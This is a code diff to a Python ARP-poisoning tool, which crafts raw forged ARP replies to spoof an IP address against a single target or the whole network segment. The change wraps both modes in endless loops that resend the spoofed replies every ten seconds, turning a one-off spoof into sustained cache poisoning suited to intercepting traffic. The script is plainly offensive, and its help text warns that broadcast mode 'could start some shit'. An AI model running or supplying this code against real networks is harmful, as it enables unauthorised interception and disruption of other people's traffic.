@@ -8,6 +8,9 @@
 
 from socket import *
 from optparse import OptionParser
+import time
+
+SLEEP_TIME = 10
 
 #poison method
 #creates raw arp reply packet 
@@ -37,7 +40,7 @@ def poison(interface, src_mac, src_ip, dst_mac, dst_ip):
 	s.send(ethernet + arp_payload + tail)
 
 def main():
-	usage = "usage: %prog [options] "
+	usage = "usage: %prog [options]"
 	parser = OptionParser(usage)
 	parser.add_option("-i", "--interface", dest="interface", help="interface to use for arping")
 	parser.add_option("-b", "--broadcast", action="store_true", dest="broadcast", help="set this to arp the entire segment.  Warning, could start some shit.")
@@ -57,7 +60,10 @@ def main():
 		ip = options.spoofed_ip.split(".")
 		src_ip = ''.join("%0.2X" % int(i) for i in ip).decode('hex')
 		src_mac = options.source_mac.replace(":", "").decode('hex')
-		poison(options.interface, src_mac, src_ip, "\xff\xff\xff\xff\xff\xff", "\xff\xff\xff\xff")
+		
+		while True:
+			poison(options.interface, src_mac, src_ip, "\xff\xff\xff\xff\xff\xff", "\xff\xff\xff\xff")
+			time.sleep(SLEEP_TIME)
 	
 	#sending a unicast arp poison
 	elif(not options.broadcast and options.spoofed_ip and options.source_mac and options.target_mac and options.target_ip):
@@ -72,7 +78,9 @@ def main():
 
 		src_mac = options.target_mac.replace(":", "").decode('hex')		
 
-		poison(options.interface, src_mac, src_ip, dst_mac, dst_ip)
+		while True:
+			poison(options.interface, src_mac, src_ip, dst_mac, dst_ip)
+			time.sleep(SLEEP_TIME)
 
 	#print menue
 	else:
